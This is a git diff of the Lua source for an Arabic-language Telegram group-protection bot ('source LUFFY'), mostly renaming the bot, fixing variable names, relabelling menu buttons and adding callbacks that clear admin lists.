 if text == 'الجروبات' and msa3d(msg) then 
-local Namebot = (bot_data:get(ban_id..'Name:Bot') or 'لوفي') 
+local Namebot = (bot_data:get(ban_id..'Name:Bot') or 'كلير') 
 local Groups = bot_data:scard(ban_id..'Chek:Groups')  
 Text = ' ● عدد الجروبات  ⇐ {`'..Groups..'`}'
 local msg_id = msg.id_/2097152/0.5  
@@ -15129,7 +15039,7 @@ local List = {
  | 𝗖𝗛 - 『@Anime_ib』 ●.
 ]],
 [[
-𝟔𝟔𝟔 𖡋 #username • 𖣰💞
+??𝟔𝟔 𖡋 #username • 𖣰💞
 ??𝟔𝟔 𖡋  #stast •??💞
 𝟔𝟔𝟔 𖡋 #id • 𖣰💞
 𝟔𝟔𝟔 𖡋 #game • 𖣰💞
@@ -16240,19 +16150,19 @@ if #group == i then
 if (w + q) == 0 then
 send(msg.chat_id_, msg.id_,' ●  لا يوجد جروبات وهميه في البوت\n')   
 else
-local LUFFY= (w + q)
-local sendok = #group - KLAER
+local LUFFY = (w + q)
+local sendok = #group - LUFFY
 if q == 0 then
-LUFFY= ''
+LUFFY = ''
 else
-LUFFY= '\n- تم ازالة  ⇐ 『 '..q..' 』 جروبات من البوت'
+LUFFY = '\n- تم ازالة  ⇐ 『 '..q..' 』 جروبات من البوت'
 end
 if w == 0 then
-KLAERk = ''
+LUFFYk = ''
 else
-KLAERk = '\n- تم ازالة  ⇐ 『 '..w..' 』 جروب لان البوت عضو'
+LUFFYk = '\n- تم ازالة  ⇐ 『 '..w..' 』 جروب لان البوت عضو'
 end
-send(msg.chat_id_, msg.id_,' ● عدد الجروبات الان  ⇐ 『 '..#group..' 』'..KLAERk..''..KLAER..'\n*- الان عدد الجروبات الحقيقي  ⇐ 『 '..sendok..' 』 جروبات\n')   
+send(msg.chat_id_, msg.id_,' ● عدد الجروبات الان  ⇐ 『 '..#group..' 』'..LUFFYk..''..LUFFY..'\n*- الان عدد الجروبات الحقيقي  ⇐ 『 '..sendok..' 』 جروبات\n')   
 end
 end
 end,nil)
@@ -16263,7 +16173,7 @@ end
 if text and text:match("^(gpinfo)$") or text and text:match("^معلومات الجروب$") then
 function gpinfo(arg,data)
 -- vardump(data) 
-KLAERdx(msg.chat_id_, msg.id_, ' ● ايدي المجموعة  ⇐ 『 '..msg.chat_id_..' 』\n ● عدد الادمنيه  ⇐ 『 *'..data.administrator_count_..' 』*\n ● عدد المحظورين  ⇐ 『 *'..data.kicked_count_..' 』*\n ● عدد الاعضاء  ⇐ 『 *'..data.member_count_..' 』*\n', 'md') 
+LUFFYdx(msg.chat_id_, msg.id_, ' ● ايدي المجموعة  ⇐ 『 '..msg.chat_id_..' 』\n ● عدد الادمنيه  ⇐ 『 *'..data.administrator_count_..' 』*\n ● عدد المحظورين  ⇐ 『 *'..data.kicked_count_..' 』*\n ● عدد الاعضاء  ⇐ 『 *'..data.member_count_..' 』*\n', 'md') 
 end 
 getChannelFull(msg.chat_id_, gpinfo, nil) 
 end
@@ -18768,7 +18678,7 @@ keyboard.inline_keyboard = {
 {{text = 'لعبه كشف الكذب', callback_data="/help47"}},
 {{text = 'مريم', callback_data="/help36"},{text = 'عقاب', callback_data="/help42"}},
 {{text = '◗القائمه الرئيسيه◖', callback_data="/add"}},
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}},
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
 end
@@ -18896,7 +18806,7 @@ keyboard.inline_keyboard = {
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
 {{text = '◗القائمه الرئيسيه◖', callback_data="/add"}},
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}},
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
 end
@@ -18933,7 +18843,7 @@ keyboard.inline_keyboard = {
 {text = '◗القائمه الرئيسيه◖', callback_data="/change-id"},
 },
 {
-{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"},
+{text = 'S0URCE LUFFY', url="t.me/Anime_ib"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -18950,7 +18860,7 @@ keyboard.inline_keyboard = {
 {text = 'اوامر الاعضاء', callback_data="/change-names"},
 },
 {
-{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"},
+{text = 'S0URCE LUFFY', url="t.me/Anime_ib"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -18974,7 +18884,7 @@ keyboard.inline_keyboard = {
 {{text = 'غنيلي', callback_data="/help17"}},
 {{text = 'نسبه جمالي', callback_data="/help18"},{text = 'اليتيوب', callback_data="/help24"}},
 {{text = '◗القائمه الرئيسيه◖', callback_data="/add"}},
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}},
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
 end
@@ -19101,7 +19011,7 @@ keyboard.inline_keyboard = {
 {text = '◗ متطوره◖', callback_data="/DRG"},
 },
 {
-{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"},
+{text = 'S0URCE LUFFY', url="t.me/Anime_ib"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
@@ -19137,7 +19047,7 @@ keyboard.inline_keyboard = {
 {text = '• الجوزاء 🌩', callback_data="/zguza"},{text = '• الدلو 🦯', callback_data="/zdlu"},
 },
 {
-{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"},
+{text = 'S0URCE LUFFY', url="t.me/Anime_ib"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
@@ -19157,21 +19067,22 @@ keyboard.inline_keyboard = {
 {text = 'نبذه عن السورس', callback_data="/change-ghjjgyy"},
 },
 {
-{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"},
+{text = 'S0URCE LUFFY', url="t.me/Anime_ib"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
 end
 if Text == '/change-hklp' then
 local Teext =[[
- سعر التنصيب علي سورس لوفي
-تواصل مع المطورين لتنصيب ولمعرفه السعر
+ سعر التنصيب علي سورس كلير
+التنصيب مجاني عشان اخواتنا بس والله الهدف من السورس دا هوايه مش فلوس
+تواصل مع المطورين لتنصيب
  ●○━━━━LUFFY━━━━○●
 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Lucas',url="t.me/il9_9li"},{text = ' F A E D E R',url="t.me/jicco"}},
+{{text = '𝚂𝙰𝚂𝙰',url="t.me/il9_9li"},{text = ' F A E D E R',url="t.me/Jicco"}},
 {{text = '˹ᴛᴀᴡᴏsʟ˼',url="t.me/ART_ABOT"}}, 
 {{text = '𝙱𝙰𝙲𝙺', callback_data="/change-hhh"}},
 }
@@ -19187,7 +19098,7 @@ local Teext =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = 'المطور لوكاس', url="t.me/il9_9li"}},
-{{text = 'المطور فايدير', url="t.me/jicco"}},
+{{text = 'المبرمج فايدير', url="t.me/Jicco"}},
 {{text = 'تواصل المبرمجين',url="t.me/ART_ABOT"}}, 
 {{text = '𝙱𝙰𝙲𝙺', callback_data="/change-hhh"}},
 }
@@ -19195,7 +19106,7 @@ return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption
 end
 if Text == '/change-ghjjgyy' then
 local Teext =[[
-📬 • 𝐚𝐛𝐨𝐮𝐭 𝐭𝐡𝐞 𝐬𝐨𝐮𝐫𝐜𝐞
+📬 • 𝐚𝐛𝐨??𝐭 𝐭𝐡𝐞 𝐬𝐨𝐮𝐫𝐜𝐞
 ●○━━━━LUFFY━━━━○●
 ●سورس خاص في حماية المجموعات من التفليش 🚸 . 
 ●تستطيع تنصيب بوتك وتصبح المطور الاساسي 👨🏼‍✈️.
@@ -19208,7 +19119,7 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}},
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}},
 {{text = '˹تــواصــل الـسـورس˼',url="t.me/ART_ABOT"}}, 
 {{text = '𝙱𝙰𝙲𝙺', callback_data="/change-hhh"}},
 }
@@ -19216,24 +19127,24 @@ return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption
 end
 if Text == '/change-siusr' then
 local Teext =[[
-𖢜 𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY⇣
+𖢜 𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 S0URCE LUFFY⇣
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'mostafa',url="t.me/il9_9li"},{text = 'F A E D E R', url=".me/jicco"}},
+{{text = 'Lucas',url="t.me/il9_9li"},{text = 'F A E D E R', url=".me/Jicco"}},
 {{text = ' مـطور الـبـوت🔒', url="http://t.me/"..sudos.UserName}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
 end
 if Text == '/bnada-yquio' then
 local Teext =[[
- source LUFFYthe best tele 
+ source LUFFY the best tele 
 we the best of tele
 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'F A E D E R',url="t.me/jicco"}},
+{{text = 'F A E D E R',url="t.me/Jicco"}},
 {{text = 'القــنــوات', callback_data="/Ajobanf"},{text = '•الــبــارات♪', callback_data="/banfai"}},  
 {{text = '•الــبــوتــات♪', callback_data="/gqjik"}},
 }
@@ -19241,33 +19152,33 @@ return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption
 end
 if Text == '/Ajobanf' then
 local Teext =[[
- source LUFFYthe best tele 
+ source LUFFY the best tele 
 we the best of tele 
 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚃𝙾 𝚃𝙷𝙴 𝙴𝙽𝙳',url="https://t.me/BOODY_Uu"},{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY',url="t.me/Anime_ib"}},
+{{text = '𝚃𝙾 𝚃𝙷𝙴 𝙴𝙽𝙳',url="https://t.me/BOODY_Uu"},{text = 'S0URCE LUFFY',url="t.me/Anime_ib"}},
 {{text = '𝙱𝙰𝙲𝙺', callback_data="/change-hhh"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
 end
 if Text == '/banfai' then
 local Teext =[[
- source LUFFYthe best tele 
+ source LUFFY the best tele 
 we the best of tele
 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚃𝙴𝙰𝙼 F A E D E R',url="t.me/BoOdY_122"}},
+{{text = '𝚃𝙴𝙰𝙼 F A E D E R',url="t.me/Anime_ib"}},
 {{text = '𝙱𝙰𝙲𝙺', callback_data="/change-hhh"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
 end
 if Text == '/gqjik' then
 local Teext =[[
- source LUFFYthe best tele 
+ source LUFFY the best tele 
 we the best of tele
 
 ]]
@@ -19275,7 +19186,7 @@ keyboard = {}
 keyboard.inline_keyboard = {
 {{text = 'بوت تواصل',url="t.me/ART_ABOT"}},
 {{text = 'بوت دعم قنوات',url="t.me/Devsasa67bot"}},
-{{text = 'بوت حمايه الجروبات ',url="t.me/jiccobot"}},
+{{text = 'بوت حمايه الجروبات ',url="t.me/Jiccobot"}},
 {{text = '𝙱𝙰𝙲𝙺', callback_data="/change-hhh"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
@@ -19284,7 +19195,7 @@ end
 
 if Text == '/HHH' then
 local Teext =[[
-𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY
+𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 S0URCE LUFFY
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -19296,11 +19207,11 @@ return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption
 end
 if Text == '/theytry' then
 local Teext =[[
-𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY
+𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 S0URCE LUFFY
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY',url="t.me/Anime_ib"},{text = '𝚃𝙾 𝚃𝙷𝙴 𝙴𝙽𝙳', url="https://t.me/BOODY_Uu"}},
+{{text = 'S0URCE LUFFY',url="t.me/Anime_ib"},{text = '𝚃𝙾 𝚃𝙷𝙴 𝙴𝙽𝙳', url="https://t.me/BOODY_Uu"}},
 {{text = 'ᴛᴀᴡᴏsʟ',url="t.me/ART_ABOT"}}, 
 {{text = '𝙱𝙰𝙲𝙺', callback_data="/HHH"}},
 }
@@ -19308,12 +19219,11 @@ return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption
 end
 if Text == '/units' then
 local Teext =[[
-𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY
+𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 S0URCE LUFFY
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'mostafa',url="t.me/il9_9li"},{text = 'body', url="t.me/jicco"}},
-{{text = '⤥𝘽.𝘼.𝙉.𝘿.𝘼🇨🇷',url="t.me/Q_o_ll"}},
+{{text = 'Lucas',url="t.me/il9_9li"},{text = 'F A E D E R', url="t.me/Jicco"}},
 {{text = '𝙱𝙰𝙲𝙺', callback_data="/HHH"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
@@ -19591,7 +19501,7 @@ local Teext =[[
 
 يتوافق مع : برج العقرب ، برج الحوت ،برج الجدي ،برج الثور
 
-الاعمال الملائمة : أطباء، صيادلة، مدرلوفي، أخصائيو تغذية، شيف، سماسرة
+الاعمال الملائمة : أطباء، صيادلة، مدركلير، أخصائيو تغذية، شيف، سماسرة
 
 ايجابيات برج السرطان : عاطفي، محب، صاحب حدس وبديهة، صاحب خيال واسع
  ●○━━━━LUFFY━━━━○●
@@ -19718,6 +19628,62 @@ keyboard.inline_keyboard = {
 {
 {text = '𝙱𝙰𝙲𝙺', callback_data="/help8"},
 },
+}
+return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
+end
+if Text == '/Delsasaban' then
+if not msa3d(data) then
+local notText = ' متلعبش ف زراير ي حببيبي'
+https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+return false
+end
+local Text = ' تـم مسح قائمه الثانوين يعم خلاص '
+bot_data:del(ban_id..'Dev:ban:2')
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = 'source LUFFY',url="t.me/Anime_ib"}},
+}
+return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
+end
+if Text == '/DelCOSUSAsa' then
+if not Devban(data) then
+local notText = ' متلعبش ف زراير ي حببيبي'
+https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+return false
+end
+local Text = ' تم مسح قائمه المالك يعم خلاص '
+bot_data:del(ban_id..'CoSu'..msg.chat_id_)
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = 'source LUFFY',url="t.me/Anime_ib"}},
+}
+return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
+end
+if Text == '/DelSudoBot' then
+if not Devban(data) then
+local notText = ' متلعبش ف زراير ي حببيبي'
+https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+return false
+end
+local Text = ' تـم مسح قائمه المطورين يعم خلاص '
+bot_data:del(ban_id..'Sudo:User')
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = 'source LUFFY',url="t.me/Anime_ib"}},
+}
+return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
+end
+if Text == '/DELGDRGUSER' then
+if not Devban(data) then
+local notText = 'متلعيش في زراير حاجه متخصكش'
+https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+return false
+end
+local Text = ' تـم مسح قائمه العام يعم خلاص '
+bot_data:del(ban_id..'GDRG:User')
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = 'source LUFFY',url="t.me/Anime_ib"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
 end
@@ -21786,7 +21752,7 @@ bot_data:srem(ban_id..'S00F4:MN:TF'..msg.chat_id_, data.sender_user_id_)
 bot_data:srem(ban_id..'Special:User'..msg.chat_id_, data.sender_user_id_)
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY',url='http://t.me/Anime_ib'}},
+{{text = 'S0URCE LUFFY',url='http://t.me/Anime_ib'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" ● تم تنزيلك من جميع الرتب")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -21797,13 +21763,13 @@ if bot_data:get(ban_id..'Set:array'..data.sender_user_id_..':'..Chat_id) == 'tru
 bot_data:del(ban_id..'Set:array'..data.sender_user_id_..':'..Chat_id)
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY',url='http://t.me/Anime_ib'}},
+{{text = 'S0URCE LUFFY',url='http://t.me/Anime_ib'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" ●︙تم حفظ الردود بنجاح*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 else
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY',url='http://t.me/Anime_ib'}},
+{{text = 'S0URCE LUFFY',url='http://t.me/Anime_ib'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" ●︙تم تنفيذ الامر سابقا*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -21813,28 +21779,28 @@ tdcli_function({ID="ChangeChatMemberStatus",chat_id_=Chat_id,user_id_=data.sende
 if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY',url='http://t.me/Anime_ib'}},
+{{text = 'S0URCE LUFFY',url='http://t.me/Anime_ib'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" ●︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
 if (data and data.code_ and data.code_ == 3) then 
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY',url='http://t.me/Anime_ib'}},
+{{text = 'S0URCE LUFFY',url='http://t.me/Anime_ib'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" ●︙البوت ليس ادمن يرجى ترقيتي !*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
 if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY',url='http://t.me/Anime_ib'}},
+{{text = 'S0URCE LUFFY',url='http://t.me/Anime_ib'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" ●︙عذرا لا استطيع طرد ادمنية الجروب*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
 if data and data.ID and data.ID == 'Ok' then
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY',url='http://t.me/Anime_ib'}},
+{{text = 'S0URCE LUFFY',url='http://t.me/Anime_ib'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" ●︙تم الطرد بنجاح*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -21844,7 +21810,7 @@ if Text == 'noKikedMe'..data.sender_user_id_ then
 local Text ="● تم الغاء الأمر بنجاح "
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY',url='http://t.me/Anime_ib'}},
+{{text = 'S0URCE LUFFY',url='http://t.me/Anime_ib'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -21853,7 +21819,7 @@ bot_data:setex(ban_id.."Ss:Cs" .. Chat_id .. ":" .. data.sender_user_id_, 600, t
 local Text ="● ارسل الاذاعة لارسلها الي الجروبات "
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY',url='http://t.me/Anime_ib'}},
+{{text = 'S0URCE LUFFY',url='http://t.me/Anime_ib'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -21862,7 +21828,7 @@ bot_data:setex(ban_id.."Send:Bc:Pv" .. Chat_id .. ":" .. data.sender_user_id_, 6
 local Text ="● ارسل الاذاعة لارسلها الي الجروبات "
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY',url='http://t.me/Anime_ib'}},
+{{text = 'S0URCE LUFFY',url='http://t.me/Anime_ib'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -21871,7 +21837,7 @@ bot_data:setex(ban_id.."YYYBD_aza3h3" .. Chat_id .. ":" .. data.sender_user_id_,
 local Text ="● ارسل الاذاعة لارسلها الي المطور الاساسي و المساعد "
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY',url='http://t.me/Anime_ib'}},
+{{text = 'S0URCE LUFFY',url='http://t.me/Anime_ib'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -21880,7 +21846,7 @@ bot_data:sadd(ban_id..'Sudo:User', result.sender_user_id_)
 local Text ="● تم الغاء الأمر بنجاح "
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY',url='http://t.me/Anime_ib'}},
+{{text = 'S0URCE LUFFY',url='http://t.me/Anime_ib'}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -21994,7 +21960,7 @@ if (text and text == "تفعيل اوامر التسليه") then
 send(msg.chat_id_, msg.id_, ' ●  تم تفعيل اوامر التسليه')
 bot_data:del(ban_id.."Fun_Bots:"..msg.chat_id_)
 end
-local Name_Bot = (bot_data:get(ban_id..'Name:Bot') or 'لوفي')
+local Name_Bot = (bot_data:get(ban_id..'Name:Bot') or 'كلير')
 if not bot_data:get(ban_id.."Fun_Bots:"..msg.chat_id_) then
 if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
 function FunBot(extra, result, success) 
@@ -22211,8 +22177,8 @@ local Bots = bot_data:get(ban_id.."lock:Bot:kick"..msg.chat_id_)
 for i=0,#mem_id do  
 if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "kick" then   
 https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
-LUFFY= https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
-local Json_Info = JSON.decode(KLAER)
+LUFFY = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
+local Json_Info = JSON.decode(LUFFY)
 if Json_Info.ok == true and #mem_id == i then
 local Msgs = {}
 Msgs[0] = msg.id_
@@ -22233,8 +22199,8 @@ local mem_id = msg.content_.members_
 local Bots = bot_data:get(ban_id.."lock:Bot:kick"..msg.chat_id_) 
 for i=0,#mem_id do  
 if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "del" then   
